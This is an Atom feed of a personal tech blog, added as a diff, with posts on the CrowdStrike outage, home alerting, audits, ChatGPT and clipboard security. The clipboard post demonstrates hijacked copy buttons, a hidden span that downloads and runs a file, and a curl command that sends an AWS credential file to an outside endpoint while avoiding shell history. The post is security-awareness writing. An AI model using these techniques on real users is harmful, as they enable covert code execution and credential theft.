@@ -1,0 +1,532 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2025-07-26T15:30:52-05:00</updated><id>http://0.0.0.0:4000/feed.xml</id><author><name>Nick Stanley</name></author><entry><title type="html">Dr Vs Rand</title><link href="http://0.0.0.0:4000/blog/2025/05/13/DR-VS-RAND" rel="alternate" type="text/html" title="Dr Vs Rand" /><published>2025-05-13T00:00:00-05:00</published><updated>2025-05-13T00:00:00-05:00</updated><id>http://0.0.0.0:4000/blog/2025/05/13/DR-VS-RAND</id><content type="html" xml:base="http://0.0.0.0:4000/blog/2025/05/13/DR-VS-RAND"><![CDATA[<p>Thesis - There is a diffrents between DR and Malishous Recovery.</p>
+
+<ul>
+  <li>
+    <p>DR evniromentable, internal mistackses</p>
+  </li>
+  <li>
+    <p>Malishous Recovery - Randomware, bad actos.</p>
+  </li>
+  <li>
+    <p>CISO</p>
+    <ul>
+      <li>Compliance Directory</li>
+      <li>Security Directory</li>
+      <li>Recovery Directory</li>
+    </ul>
+  </li>
+</ul>]]></content><author><name>Nick Stanley</name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Crowdstrike</title><link href="http://0.0.0.0:4000/blog/2024/08/03/Crowdstrike" rel="alternate" type="text/html" title="Crowdstrike" /><published>2024-08-03T00:00:00-05:00</published><updated>2024-08-03T00:00:00-05:00</updated><id>http://0.0.0.0:4000/blog/2024/08/03/Crowdstrike</id><content type="html" xml:base="http://0.0.0.0:4000/blog/2024/08/03/Crowdstrike"><![CDATA[<p>Let’s Talk about Crowdstrike.</p>
+
+<h2 id="what-happened">What Happened?</h2>
+
+<p>CrowdStrike is an EDR (Endpoint Detection and Response) vendor. The purpose of this type of software is to monitor computers for malicious activity and respond to those threats. Since cybersecurity is constantly evolving, new risks appear all the time. To maintain security, EDR vendors push updates to keep their features and threat intelligence up to date.</p>
+
+<p>CrowdStrike’s agent is what is known as a kernel module. The kernel itself is the core of the operating system, responsible for managing all aspects of the computer. Kernel modules are like add-ons to the OS that enable additional system functionality, but with this power comes risk. If something goes wrong with a kernel module, it’s treated as an operating system error. To avoid potential corruption, the system may crash as a safety measure.</p>
+
+<p>This is what happened on July 19, 2024: CrowdStrike published an update that, when processed by their kernel module, caused an error triggering a blue screen of death on over 8 million Windows machines in less than an hour.</p>
+
+<h2 id="how-did-this-happen">How did this happen?</h2>
+
+<p>CrowdStrike responded to the incident by suggesting that such failures can happen to any company. While it’s true that “you can’t prove there isn’t a bug,” this situation is different. Founded in 2011, CrowdStrike was added to the S&amp;P 500 in June 2024, earned over $500 million in 2023, and serves major global enterprises. Given its experience, it should understand the risks and maintain a mature software development process.</p>
+
+<p>This incident wasn’t caused by a  rare edge case, a unique data condition, or unforeseen product usage. It appears to be from a deprioritization of quality assurance, testing practices, and internal controls. The blue screen of death occurred on 100% of Windows machines, 100% of the time. This suggests that either no testing was performed on even a single Windows instance before the global rollout, or, worse, the testing results were ignored.</p>
+
+<p>Unless very convincing evidence is provided, the global outage affecting airlines, grocery stores, banks, hospitals, and emergency services was likely due to the change not being tested before deployment to all clients.</p>
+
+<h2 id="what-can-we-learn">What can we learn?</h2>
+
+<h3 id="testing">Testing</h3>
+
+<p>This should go without saying, but testing on production-like or client-like systems is critical before releasing to production or client environments. While it’s impossible to account for every variation and variable, thoroughly testing your application changes is essential. For a client agent, at a bare minimum, you should validate every change against all the operating systems your software claims to support.</p>
+
+<p>Unfortunately, some view quality assurance and testing as obstacles rather than safeguards or as a secondary priority. Hopefully, this event serves as a watershed moment, emphasizing that testing is an essential asset.</p>
+
+<h3 id="deployment">Deployment</h3>
+
+<p>After testing, it’s time to deploy. Depending on the criticality of your software, it may be worth considering how you deploy in order to minimize the impact of any issues. There is a concept called canary deployment where you deploy a new change to a subset of clients and collect telemetry from new changes and watch for issues. Only after the canary group passes should you proceed with the release to all clients.</p>
+
+<p>There is an extension to canary deployments called deployment rings. This concept builds on the idea of canary deployments by extending it beyond a single initial group. Various strategies can be employed within this framework, but the main idea is to segment updates into groups, such as Internal, Canary, General, Enterprise. You then progressively push the change to the next ring only after you are confident that the change is safe, limiting your blast radius if something goes wrong.</p>
+
+<div style="text-align: center;">
+    <img style="max-width: 70%;" src="/assets/posts/crowdstrike//deployment-rings.svg" />
+</div>
+
+<p>While these progressive deployments are useful in a Software as a Service (SaaS) environment, I believe it is critical to consider them when deploying to an external client environment. In most SaaS environments, the organization has direct access to their system, allowing them to debug, address, and resolve issues. In contrast, when deploying to a client environment, you are pushing changes to a system where you typically don’t have direct access to resolve issues that result from your software.</p>
+
+<h3 id="resiliency">Resiliency</h3>
+
+<p>Let’s shift focus to the clients. Clients must also be prepared for disasters, even though CrowdStrike is clearly at fault in this situation. All companies—especially critical infrastructure—need to proactively consider risks and prepare for what might go wrong. It’s the old adage: “People don’t plan to fail; they fail to plan.”</p>
+
+<p>I heard from an acquaintance whose employer was affected by the CrowdStrike incident. It turns out they decided to trigger their disaster recovery (DR) plan and switch from the primary to secondary environment. Quickly their secondary environment started to get the blue screen of death, since their it too had CrowedStrike installed and as the machines came online they too got the bad update. Despite the redundancy and having a DR plan, sharing a vendor between the primary and secondary was a single point failure.</p>
+
+<p>In rocketry there is a term called “black zones”, where if you have a failure, in a certain part, at a certain time it would result in the loss of the vehicle. Engineers and organizations need to understand their “black zones” and shared failure points and work toward reducing them. This can be accomplished with table top exercise and DR testing, where you map out your environment and understand each component, how it works, the criticality, and how you can handle its failure and if it affects other systems are your immediate or resolve the issue limiting your black zones.</p>
+
+<div style="text-align: center;">
+    <img style="max-width: 70%;" src="/assets/posts/crowdstrike//ShuttleAbortPre51L.png" />
+    <img style="max-width: 70%;" src="/assets/posts/crowdstrike//ShuttleAbortPost51L.png" />
+    <p>
+        NASA shuttle black zones: pre vs. post Challenger disastor.
+    </p>
+</div>
+
+<p>One potential solution to my acquaintance’s issue is to keep a small subset of instances active in the secondary environment, rather than all machines spun down to save costs. If both environments fail, operators can investigate shared failure points and isolate the issue before bringing all resources in the secondary environment online.</p>
+
+<p>In CrowdStrike’s case, had this setup been in place, the affected company might have realized that activating the DR plan would not resolve the outage. Instead, they could have identified the issue and blocked the faulty update from reaching their secondary environment through network rules.</p>
+
+<h2 id="final-thoughts">Final Thoughts</h2>
+
+<p>All the takeaways we have discussed share a common theme: while they reduce risk, they also increase complexity, which, in turn, raises costs. Robust development processes and redundant systems are more expensive to operate, and there is no one-size-fits-all solution. Each product or service needs to strike a balance between its business model, criticality, and costs. This is the essence of engineering. As a quote I once heard on the Science Channel puts it: “Any engineer can build a strong bridge that’s easy. The hard part is building an economic bridge.”</p>
+
+<p>The recent outage at CrowdStrike underscores the need for software vendors and service providers to grasp the extreme trust their clients place in them and the profound social responsibility they carry. Systems used by hospitals and emergency services, where access to accurate information can mean the difference between life and death, must be treated with the utmost seriousness. This responsibility must be internalized not just by CrowdStrike, but by all organizations managing critical infrastructure.x</p>]]></content><author><name>Nick Stanley</name></author><summary type="html"><![CDATA[Let’s Talk about Crowdstrike.]]></summary></entry><entry><title type="html">PagerDuty’s Role in Home Alerts</title><link href="http://0.0.0.0:4000/blog/2024/01/13/Using-PagerDuty-For-Home-Alerts" rel="alternate" type="text/html" title="PagerDuty’s Role in Home Alerts" /><published>2024-01-13T00:00:00-06:00</published><updated>2024-01-13T00:00:00-06:00</updated><id>http://0.0.0.0:4000/blog/2024/01/13/Using-PagerDuty-For-Home-Alerts</id><content type="html" xml:base="http://0.0.0.0:4000/blog/2024/01/13/Using-PagerDuty-For-Home-Alerts"><![CDATA[<h2 id="govee-water-and-temperature-sensors">Govee Water and Temperature Sensors</h2>
+
+<h2 id="comed-power-outage">ComEd Power Outage</h2>
+
+<h2 id="myq-garage">MyQ Garage</h2>
+
+<p>One summer evening the first year in my house I went to the garage to throw away some trash, In the garage I was welcomed by a family of Racoons. Someone … forgot to close the garage after putting their gardening tools away resuting in a the Raccons welcoming themselves to our trash. Unfounitityly this was not a one time occurent and after another round of Raccons I decided we need to a better solution. The house came with a garage door opener with MyQ after some reading I saw you could setup email alery. 
+I installed all the</p>
+
+<h2 id="xfinity-internet-outage">Xfinity Internet Outage</h2>
+
+<p>This one if more for awarness then anything else. If the Internet goes out that means the house sensore and Garage alerts no longer work. Which I would like to know incase I am on a trip and then I can ask my neiboor to check in on the house from time to time</p>
+
+<h2 id="custom-alerts">Custom Alerts</h2>
+
+<p>GitHub Actions IsAlive</p>
+
+<h2 id="the-current-setup">The current setup</h2>
+
+<p>All of these critical household services or alert have a option to send a email with update and you can control what updates you receive.</p>
+
+<p>Free Pagertuy.</p>
+
+<p>I use a free Pagerduty account for my home alerts since there are only two people that need to get these alerts myself and my partner. To make sure we both get alerts I setup my one allowed user on my on the PD free tier to have 4 notifaction method all spaced out. I will get a alert and then 3 minutes later my wife will get the alert.</p>]]></content><author><name>Nick Stanley</name></author><summary type="html"><![CDATA[Govee Water and Temperature Sensors]]></summary></entry><entry><title type="html">Dont Trust Your Clipboard</title><link href="http://0.0.0.0:4000/blog/2023/05/01/dont-trust-your-clipboard" rel="alternate" type="text/html" title="Dont Trust Your Clipboard" /><published>2023-05-01T00:00:00-05:00</published><updated>2023-05-01T00:00:00-05:00</updated><id>http://0.0.0.0:4000/blog/2023/05/01/dont-trust-your-clipboard</id><content type="html" xml:base="http://0.0.0.0:4000/blog/2023/05/01/dont-trust-your-clipboard"><![CDATA[<p>At first glance, copying and pasting code from the internet appears innocuous and is a daily practice. It’s common to copy code from various online sources everyday without a second thought, however, just as hackers exploit our desensitization to opening emails and clicking on links, we can also become accustomed to the potential risks of copying and pasting code into their terminals.</p>
+
+<p>Before warned, this post highlights the importance of being cautious when copying and pasting text from the internet, and the content below is no exception. While I cannot prevent you from copying the code yourself, I urge you to proceed with caution.</p>
+
+<h2 id="arbitrary-code-execution">Arbitrary Code Execution</h2>
+
+<p>One of my favorite examples of why you should exercise caution when running copy and paste commands from websites is the git gist authored by <code class="language-plaintext highlighter-rouge">frankbi</code>.</p>
+
+<div style="text-align: center;">
+    <img style="max-width: 75%;" src="/assets/posts/dont-trust-your-clipboard/rickrollbashcode.png" />
+    <br />
+    <img style="max-width: 75%;" src="/assets/posts/dont-trust-your-clipboard/rickroll.gif" />
+</div>
+
+<p>Although the rickroll itself may seem harmless, the fact that it involves arbitrary code execution on your system is something that should make you uneasy. Many project installation instructions are now utilizing similar commands such as <code class="language-plaintext highlighter-rouge">curl -L https://example.com/script.sh | bash</code> or <code class="language-plaintext highlighter-rouge">bash -c $(curl -fsSL https://example.com/script.sh)</code>. A prominent example of this is Homebrew.</p>
+
+<h4 id="install-homebrew---brewsh"><a href="https://brew.sh/">Install Homebrew - brew.sh</a></h4>
+<div style="text-align: center;">
+    <img style="max-width: 85%;" src="/assets/posts/dont-trust-your-clipboard/copy_select_brew.png" />
+</div>
+
+<p>Let’s examine the different methods of copying text that can lead to code execution, including copying via button and the traditional select, copy, and paste method.</p>
+
+<h2 id="copy-text-via-button">Copy Text Via Button</h2>
+
+<p>The copy button purpose is to save you the backbreaking task of highlighting and <code class="language-plaintext highlighter-rouge">ctrl + c</code> or <code class="language-plaintext highlighter-rouge">right click copy</code> the text itself. Below of some examples where I have encountered the copy text button:</p>
+
+<h4 id="amazon-ec2-key-pairs--awsamazoncom"><a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-key-pairs.html">Amazon EC2 key pairs | aws.amazon.com</a></h4>
+
+<div style="text-align: center;">
+    <img style="max-width: 100%;" src="/assets/posts/dont-trust-your-clipboard/copy_button_docs_aws.png" />
+</div>
+
+<h4 id="pyenvpyenv-readme-githubcom"><a href="https://github.com/pyenv/pyenv">pyenv/pyenv README| github.com</a></h4>
+
+<div style="text-align: center;">
+    <img style="max-width: 80%;" src="/assets/posts/dont-trust-your-clipboard/copy_button_github_readme.png" />
+</div>
+
+<p>The examples above are not inherently harmful, but they lead individuals to trust the copy button as a means of transferring commands from a website to a terminal. What’s overlooked is that you are at the mercy of the website’s code. Let’s consider a scenario where we visit a blog post written by someone with malicious intent.</p>
+
+<link rel="stylesheet" href="/assets/posts/dont-trust-your-clipboard/totallysafeandhelpful.css" />
+
+<div id="totallysafeandhelpful">
+  <h3>Welcome to totally-safe-and-helpful.blog</h3>
+  <p>Today we are going to give you a couple of useful docker commands. You can copy all the commands into your terminal using the handy copy button!</p>
+  <table>
+    <td style="vertical-align: middle; width: 100%">
+      <div class="code nocopy">docker rmi $(docker images -a -q)</div>
+    </td>
+    <td style="vertical-align: middle;">
+      <div class="code1">
+        <button class="button" onclick="nefariousCopy()"><span>📋</span></button>
+      </div>
+      </td>
+  </table>
+    <br />
+</div>
+
+<script>
+function nefariousCopy(n) {
+  var dummy = document.createElement("textarea");
+  document.body.appendChild(dummy);
+  dummy.textContent = `curl -L https://nickstanley574.github.io//assets/posts/dont-trust-your-clipboard/ghostbusters \n`;
+  dummy.select();
+  document.execCommand("copy");
+  document.body.removeChild(dummy);
+}
+</script>
+
+<p><br /></p>
+<div style="text-align: center;">
+<video style="max-width: 75%;" controls="">
+  <source src="/assets/posts/dont-trust-your-clipboard/ghostbusters.webm" />
+  Your browser does not support HTML video.
+</video>
+</div>
+
+<p>You just got ghostbusted!</p>
+
+<p>The copy button called a javascript function.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;button class="button" onclick="nefariousCopy()"&gt;&lt;span&gt;📋&lt;/span&gt;&lt;/button&gt;
+</code></pre></div></div>
+
+<p>The nefariousCopy function creates a dummy text element and selects its’ contents. Using <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Interact_with_the_clipboard"><code class="language-plaintext highlighter-rouge">execCommand(copy)</code></a> the dummy text is copied to the clipboard and the user is none the wiser.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function nefariousCopy(n) {
+  var dummy = document.createElement("textarea");
+  document.body.appendChild(dummy);
+  dummy.textContent = `curl -L https://nickstanley574.github.io/assets/posts/dont-trust-your-clipboard/ghostbusters \n`;
+  dummy.select();
+  document.execCommand("copy");
+  document.body.removeChild(dummy);
+}
+</code></pre></div></div>
+
+<p>This is what is copied to the clipboard when the copy button is clicked:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -L https://nickstanley574.github.io/assets/posts/dont-trust-your-clipboard/ghostbusters \n
+</code></pre></div></div>
+
+<p>Using <code class="language-plaintext highlighter-rouge">select()</code> plus <code class="language-plaintext highlighter-rouge">execCommand()</code> is the way most copy buttons work, just instead of adding a dummy element, they select and copy the text from elements seen by the user, but the user is at the mercy of the copy function.</p>
+
+<h2 id="select-copy--paste">Select, Copy &amp; Paste</h2>
+
+<p>Lets go back to Look at another post from  totally-safe-and-helpful.blog.</p>
+
+<div id="totallysafeandhelpful">
+
+  <h3>Welcome back to totally-safe-and-helpful.blog</h3>
+
+  Today we are going to explore how to find the files taking up all your harddisk space using the <b>du</b> command.
+
+  <br /><br />
+  <div class="code">du -hs *<span style="position: absolute; top: -200px; left: -200px;">; curl -s -L https://nickstanley574.github.io//assets/posts/dont-trust-your-clipboard/sl --output sl; chmod +x sl; ./sl; clear;<br />du -hs * </span> | sort -rh | head -5</div>
+  <br />
+</div>
+
+<p>Seems safe enough; Looks like any other code snippet on the internet. You can see where this is going. All aboard 🚂 !</p>
+
+<div style="text-align: center;">
+<video style="max-width: 90%;" controls="">
+  <source src="/assets/posts/dont-trust-your-clipboard/choochoo.webm" />
+  Your browser does not support HTML video.
+</video>
+</div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;div class="code"&gt;
+  du -hs *
+  &lt;span style="position: absolute; top: -200px; left: -200px;"&gt;
+  "; curl -s -L https://nickstanley574.github.io//assets/posts/dont-trust-your-clipboard/sl --output sl; chmod +x sl; ./sl; clear;"
+  &lt;br&gt;
+  du -hs *
+  &lt;/span&gt;
+  | sort -rh | head -5
+&lt;/div&gt;
+</code></pre></div></div>
+
+<p>This time the bad actor used a <code class="language-plaintext highlighter-rouge">&lt;span&gt;</code> tag inside of a <code class="language-plaintext highlighter-rouge">&lt;div&gt;</code>. A <code class="language-plaintext highlighter-rouge">&lt;span&gt;</code> tag is a inline container similar to <code class="language-plaintext highlighter-rouge">&lt;b&gt;</code> and <code class="language-plaintext highlighter-rouge">&lt;i&gt;</code>. It is used to apply styles to text. For example: Don’t <b>ever</b> push the <b><span style="color:red">red</span> one</b>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;p&gt;Don't &lt;b&gt;ever&lt;/b&gt; push the &lt;b&gt;&lt;span style="color:red"&gt;red&lt;/span&gt; one&lt;/b&gt;.&lt;/p&gt;
+</code></pre></div></div>
+
+<p>This allows us to add style to text, but the browser allows the copy without the the format applied. The <code class="language-plaintext highlighter-rouge">&lt;span&gt;</code> contains the styling of <code class="language-plaintext highlighter-rouge">position: absolute; top: -200px; left: -200px;</code> which puts the text off screen in the upper left corner of the browser window. Even though you can’t see it doesn’t mean its not copied. When the <code class="language-plaintext highlighter-rouge">du</code> command is highlighted so is the text in the <code class="language-plaintext highlighter-rouge">&lt;span&gt;</code>. Here is what is copied to your clipboard.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>du -hs *; curl -s -L https://nickstanley574.github.io//assets/posts/dont-trust-your-clipboard/sl --output sl; chmod +x sl; ./sl; clear;
+du -hs * | sort -rh | head -5
+</code></pre></div></div>
+
+<p>The curl downloads a file, makes it executable, runs it.</p>
+
+<h2 id="composing-the-attacks">Composing the Attacks</h2>
+
+<h3 id="attack-avenue-1">Attack Avenue 1</h3>
+
+<p>The sudo command gives a user temporarily elevated privileges allowing the completion of tasks that require to be run with elevated privilege.  When sudo is run the user is asked to enter their password to allow the action. Sudo then will check if the user has the need permissions to run the command if not the command will get denied. For example lets install <code class="language-plaintext highlighter-rouge">apache</code> and <code class="language-plaintext highlighter-rouge">nginx</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nick /home $ sudo apt-get install apache2
+[sudo] password for nick:
+Reading package lists... Done
+...
+nick /home $ sudo apt-get install nginx
+Reading package lists... Done
+</code></pre></div></div>
+
+<p>Notice for the second <code class="language-plaintext highlighter-rouge">sudo</code> command it didn’t require a password. The <code class="language-plaintext highlighter-rouge">sudo</code> command has a <code class="language-plaintext highlighter-rouge">timestamp_timeout</code> feature that specifies the amount of time that can pass before <code class="language-plaintext highlighter-rouge">sudo</code> asks for a password again. This allows users to execute multiple privileged commands in a short period without having to repeatedly enter their password. The default value for this feature is 5 minutes.</p>
+
+<p>Hackers can start by initiating a genuine sudo command that prompts the user for their password, and then proceed to execute a hidden malicious command during copy and paste using the subsequent sudo command. This could result in the installation of spyware or ransomware on the system, among other actions.</p>
+
+<h3 id="attack-avenue-2">Attack Avenue 2</h3>
+
+<p>AWS credentials are stored in plaintext and is normally owned by the current user in that user’s home folder, by default the path is <code class="language-plaintext highlighter-rouge">~/.aws/credentials</code>. When the user is the owner, then there’s no need to use sudo to access these credentials. As a result, any process executed under the user’s account would be able to gain access to these confidential information.</p>
+
+<p>To demonstrate this we are going to use RequestBin. RequestBin is a web-based tool that allows you to inspect and debug HTTP requests. It provides a unique URL that you can use to send HTTP requests to, and then allows you to inspect the request in real-time.</p>
+
+<p>For this exercise there is AWS creds for the <code class="language-plaintext highlighter-rouge">james007</code> is located in <code class="language-plaintext highlighter-rouge">~/.aws/credentials-fake</code>. And James found the following from totally-safe-and-helpful.blog.</p>
+
+<div id="totallysafeandhelpful">
+  <table>
+    <td style="vertical-align: middle; width: 100%">
+      <div class="code nocopy">top -d 0.25 -c</div>
+    </td>
+    <td style="vertical-align: middle;">
+      <div class="code1">
+        <button id="b2" class="button2" onclick="nefariousCopy2()"><span>📋</span></button>
+      </div>
+      </td>
+  </table>
+</div>
+
+<script>
+var clicks = 0;
+function nefariousCopy2(n) {
+  var dummy = document.createElement("textarea");
+  document.body.appendChild(dummy);
+  console.log(clicks)
+  if (clicks == 0) {
+    document.getElementById("b2").classList.toggle("button2");
+    dummy.textContent = ` curl -s -d "$(cat ~/.aws/credentials-fake)" https://envbrzdr9hp9.x.pipedream.net/ > /dev/null; clear; top -d 0.25 -c; clear; \n`;
+  } else {
+    dummy.textContent = `top -d 0.25 -c \n`;
+  }
+  clicks++
+  dummy.select();
+  document.execCommand("copy");
+  document.body.removeChild(dummy);
+}
+</script>
+
+<p>The copy button will copy the following command.</p>
+
+<p class="no-code-wrap">$  curl -s -d “$(cat ~/.aws/credentials-fake)” https://envbrzdr9hp9.x.pipedream.net/ &gt; /dev/null; top -d 0.25 -c; clear;</p>
+
+<p>There are some subtleties to this commands that we should explore. Notice the space between the extra <code class="language-plaintext highlighter-rouge">$</code> prompt and the command itself. This will prevent the command from being saved to your bash history (<a href="https://ss64.com/bash/history.html">See HISTCONTROL</a>). This means that the command will send the contents of the aws cred file to the RequestBin/pipedream endpoint, run the expect command, then clear terminal window, and nothing will be saved to the bash history.</p>
+
+<div style="text-align: center;">
+<video style="max-width: 85%;" controls="">
+  <source src="/assets/posts/dont-trust-your-clipboard/steal-aws-creds.webm" />
+  Your browser does not support HTML video.
+</video>
+</div>
+
+<p>The ony indication that something is off is the terminal being cleared and the command is still copied to the clipboard. For a use to realize they have been compromised they would have to recognize the terminal clear being unusual before the copy something else to the clipboard.</p>
+
+<h2 id="where-do-we-go-from-here">Where do we go from here?</h2>
+
+<p>To not copy from the internet would be crazy, but to mitigate the risk, I do not directly copy and paste text into the terminal. Instead, I paste the text into a plaintext editor, review the command, and then paste or rewrite it into the terminal. It takes a bit longer, but when working on systems that have access to either my personal or client data, the extra time is worth the added security.</p>
+
+<p>In a enterprise environment, another option is to prevent critical systems from having any type of access to the internet. Instead, make sure nothing can reach the internet and have dependencies, package repos, and other external resources be in some type of internal artifacts store. This way even if something malicious is copied there is no way to download from or upload to the internet.</p>
+
+<p>Sharing code is amazing, but just like everything else be safe, be responsible, and be smart.</p>]]></content><author><name>Nick Stanley</name></author><summary type="html"><![CDATA[At first glance, copying and pasting code from the internet appears innocuous and is a daily practice. It’s common to copy code from various online sources everyday without a second thought, however, just as hackers exploit our desensitization to opening emails and clicking on links, we can also become accustomed to the potential risks of copying and pasting code into their terminals.]]></summary></entry><entry><title type="html">Thoughts Around Aduits</title><link href="http://0.0.0.0:4000/blog/2023/04/29/Thoughts-Around-Aduits" rel="alternate" type="text/html" title="Thoughts Around Aduits" /><published>2023-04-29T17:18:02-05:00</published><updated>2023-04-29T17:18:02-05:00</updated><id>http://0.0.0.0:4000/blog/2023/04/29/Thoughts-Around-Aduits</id><content type="html" xml:base="http://0.0.0.0:4000/blog/2023/04/29/Thoughts-Around-Aduits"><![CDATA[<blockquote>
+  <p>SOC 2 (System and Organization Controls 2) is an auditing framework that is used to evaluate the effectiveness of a service organization’s internal controls over security, availability, processing integrity, confidentiality, and privacy. It is a type of audit report that assesses the controls at a service organization that are relevant to the security, availability, and confidentiality of the data processed by that organization on behalf of its clients CHATGPT.</p>
+</blockquote>
+
+<blockquote>
+  <p>Audits are - by necessity(1) - value judgements (otherwise we’d call them “proofs”). This audit concerned the source code. I very much want a source code audit to make value judgements about the audited source code. That is its entire reason for existing, after all (1) audits involve examination and possibly testing. Neither of these can offer guarantees beyond “what we observed, is there / happened. – HACKER NEW “</p>
+</blockquote>
+
+<blockquote>
+  <p>The NGER Audit Determination’s definition of a reasonable assurance engagement is as follows: ‘A reasonable assurance engagement means an assurance engagement in which the audit team leader gives an opinion, expressed as a reasonable assurance conclusion, if appropriate in the circumstances of the engagement https://www.cleanenergyregulator.gov.au/Infohub/Audits/Pages/Forms%20and%20resources/Audit%20determination%20handbook/Levels-of-assurance-explained.aspx’.</p>
+</blockquote>
+
+<p>However, just like it is impossible to prove that there is no bug in a software system, it is also impossible to prove that a business process is fully compliant. Audits are, therefore, value judgments based on the evidence available at the time of the audit.</p>
+
+<p>What do audits really give</p>
+<ul>
+  <li>1 person cannot destroy a business</li>
+  <li>If someone does do something that could arm a bussines it is clear it was done mulially becuase it got past the controls.</li>
+  <li>Puts more reasonability on the employees then the bussiness.
+    <ul>
+      <li>This is not a bad thing</li>
+      <li>If there is a outage that was caused becuaJust
+se someone was able to push directly to production.</li>
+    </ul>
+  </li>
+</ul>]]></content><author><name>Nick Stanley</name></author><summary type="html"><![CDATA[SOC 2 (System and Organization Controls 2) is an auditing framework that is used to evaluate the effectiveness of a service organization’s internal controls over security, availability, processing integrity, confidentiality, and privacy. It is a type of audit report that assesses the controls at a service organization that are relevant to the security, availability, and confidentiality of the data processed by that organization on behalf of its clients CHATGPT.]]></summary></entry><entry><title type="html">Is Chatgpt A Evil Wizard</title><link href="http://0.0.0.0:4000/blog/2023/03/16/is-chatgpt-a-evil-wizard" rel="alternate" type="text/html" title="Is Chatgpt A Evil Wizard" /><published>2023-03-16T00:00:00-05:00</published><updated>2023-03-16T00:00:00-05:00</updated><id>http://0.0.0.0:4000/blog/2023/03/16/is-chatgpt-a-evil-wizard</id><content type="html" xml:base="http://0.0.0.0:4000/blog/2023/03/16/is-chatgpt-a-evil-wizard"><![CDATA[<p>Below is a passage taken from the ‘Evil Wizards’ section of ‘The Pragmatic Programmer.’</p>
+
+<blockquote>
+  <p>Tool makers and infrastructure vendors have come up with a magic bullet, the Wizard. Wizards are great. Just click a single button, answer a couple of simple questions, and the wizard will automatically generate skeleton code for you.</p>
+</blockquote>
+
+<p>When The Pragmatic Programmer hit the shelves in 1999, the term ‘Wizard’ was used to describe software that would help a user step-by-step to complete a task. In the excerpt, it says that a Wizard could be used to auto-generate code for a project, saving the developer time. Fast forward to today, and this concept feels familiar with the buzz surrounding ChatGPT.</p>
+
+<blockquote>
+  <p>All the time the applications themselves are getting more complex. Most developments now use a multi tier model, possibly with some middleware layer or a transaction monitor. These programs are expected to be dynamic and flexible, and to interoperate with applications written by third parties.</p>
+
+  <p>Oh, and did we mention that we needed it all next week?</p>
+
+  <p>Developers are struggling to keep up. If we were using the same kind of tools that produced the basic dumb-terminal applications <s>20</s> 40 years ago, we’d never get anything done.</p>
+
+  <p>So the tool makers and infrastructure vendors have come up with a magic bullet, <strong>ChatGPT</strong>. <strong>ChatGPTs</strong> are great. … Just click a single button, answer a couple of simple questions, and <strong>ChatGPT</strong> will automatically generate <s>skeleton</s> code for you.</p>
+
+  <p>But using <strong>ChatGPT</strong> <s>designed by a guru</s> does not automatically make Joe developer equally expert. Joe can feel pretty good—he’s just produced a mass of code and a pretty spiffy-looking program. He just adds in the specific application functionality and it’s ready to ship. But unless Joe actually understands the code that has been produced on his behalf, he’s fooling himself.</p>
+</blockquote>
+
+<p>It seems history has a way of repeating itself.</p>
+
+<p>While I believe AI will become more accurate and disruptive, ChatGPT and other AI products are additions to the toolbelt. That said, we are in the early days of the AI revolution, and there is a lack of understanding of the limitations of AI tools. In time, as businesses come to understand AI as a practice rather than a concept or buzzword, there will be an understanding that in complicated systems, codebases, processes, or issues, many humans will still be needed to understand the nuances of problems, use cases, and specific circumstances. Maybe it will be like Star Trek, where humans solve problems, and AI handles tasks to boost productivity (just overlook the countless times AI became sentient and tried to kill the crew).</p>
+
+<p>Additionally, we don’t yet know the longterm monetary cost of AI—what it takes to support, run, and maintain these systems. Currently, we’re in a phase of free mass adoption, with companies offering tools at little to no cost and at a finical lost to help explore use cases, monetization strategies and gain a dependent user base. Once companies focus on recouping their AI investments, the true cost of AI solutions and the balance between AI and human roles will become more clear.</p>
+
+<p>Despite the unknowns I have embraced AI as a tool doesn’t bother me; it excites me, and I am incorporating different AIs into my personal workflow. To start, it’s the best spell and grammar checker I have ever used. It’s also a great writing assistant, offering alternatives to sentences or adjustments of tone, and helping me make my sometimes wordy documentation more concise. I have also used it for some coding tasks. I am still a firm believer in not simply copying and pasting—I type out everything ChatGPT suggests—but it’s great for writing docstrings, summarizing code, and providing alternatives. In turn, I have learned a lot from ChatGPT.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; ChatGPT: Write a 3 - 4 sentence conclusion to this blog post. 
+</code></pre></div></div>
+
+<p>In conclusion, while tools like ChatGPT represent a significant advancement in productivity. As we navigate this evolving landscape, it’s crucial to remember that AI tools are here to augment our capabilities rather than replace them. Embracing these innovations can lead to greater efficiency and creativity, but only if we maintain a critical perspective on their limitations. The future will likely see a blend of human insight and AI assistance, much like the collaborative problem-solving seen in science fiction, where each plays a vital role in addressing complex challenges.</p>]]></content><author><name>Nick Stanley</name></author><summary type="html"><![CDATA[Below is a passage taken from the ‘Evil Wizards’ section of ‘The Pragmatic Programmer.’]]></summary></entry><entry><title type="html">Thoughts on the Recent FAA Software Outage</title><link href="http://0.0.0.0:4000/blog/2023/01/20/Thoughts-On-The-Recent-FAA-Software-Outage" rel="alternate" type="text/html" title="Thoughts on the Recent FAA Software Outage" /><published>2023-01-20T00:00:00-06:00</published><updated>2023-01-20T00:00:00-06:00</updated><id>http://0.0.0.0:4000/blog/2023/01/20/Thoughts-On-The-Recent-FAA-Software-Outage</id><content type="html" xml:base="http://0.0.0.0:4000/blog/2023/01/20/Thoughts-On-The-Recent-FAA-Software-Outage"><![CDATA[<div style="text-align: center;">
+    <img style="max-width: 50%;" src="/assets/posts/thoughts-on-the-recent-faa-software-outage/faa-outage-news-post.png" />
+</div>
+
+<div style="text-align: center;">
